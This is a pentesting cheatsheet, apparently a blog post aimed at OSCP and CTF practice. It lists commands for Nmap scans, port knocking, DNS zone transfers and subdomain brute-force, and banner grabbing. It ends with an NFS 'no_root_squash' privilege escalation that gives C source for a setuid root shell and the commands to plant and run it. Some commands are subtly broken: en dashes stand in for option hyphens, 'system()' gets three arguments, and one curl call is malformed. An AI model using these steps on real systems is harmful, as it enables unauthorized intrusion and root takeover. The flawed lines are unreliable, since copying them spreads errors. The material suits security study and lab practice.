---
title: Pentesting Cheatsheets
author: Sachin
date: 2019-08-09 20:55:00 +0800
categories: [Pentesting, Cheatsheet]
tags: [Pentest, OSCP, CTF]
pin: true
---


## Reconnaissance / Enumeration

### Extracting Live IPs from Nmap Scan

```bash
nmap 10.1.1.1 --open -oG scan-results; cat scan-results | grep "/open" | cut -d " " -f 2 > exposed-services-ips
```

### Simple Port Knocking

```bash
for x in 7000 8000 9000; do nmap -Pn –host_timeout 201 –max-retries 0 -p $x 1.1.1.1; done
```

### DNS lookups, Zone Transfers & Brute-Force

```bash
whois domain.com
dig {a|txt|ns|mx} domain.com
dig {a|txt|ns|mx} domain.com @ns1.domain.com
host -t {a|txt|ns|mx} megacorpone.com
host -a megacorpone.com
host -l megacorpone.com ns1.megacorpone.com
dnsrecon -d megacorpone.com -t axfr @ns2.megacorpone.com
dnsenum domain.com
nslookup -> set type=any -> ls -d domain.com
for sub in $(cat subdomains.txt);do host $sub.domain.com|grep "has.address";done
```

### Banner Grabbing

```bash
nc -v $TARGET 80
telnet $TARGET 80
curl -vX $TARGET
```

### NFS Exported Shares

List NFS exported shares:

```bash
showmount -e 192.168.110.102
```

...and check if `'rw,no_root_squash'` is present. If it is present, compile the below `sid-shell.c`:

{% code title="sid-shell.c" %}
```cpp
#include <unistd.h>

main( int argc, char ** argv, char ** envp )
{
    setgid(0); setuid(0); system("/bin/bash", argv, envp);
    return 0;
}
```
{% endcode %}

...upload it to the share and execute the below to launch `sid-shell` to spawn a root shell:

```bash
chown root:root sid-shell; chmod +s sid-shell; ./sid-shell
```


This was inspired by and forked/adapted/updated from [ired team's Pentest Notes](https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/tree/master/offensive-security-experiments/offensive-security-cheetsheets).
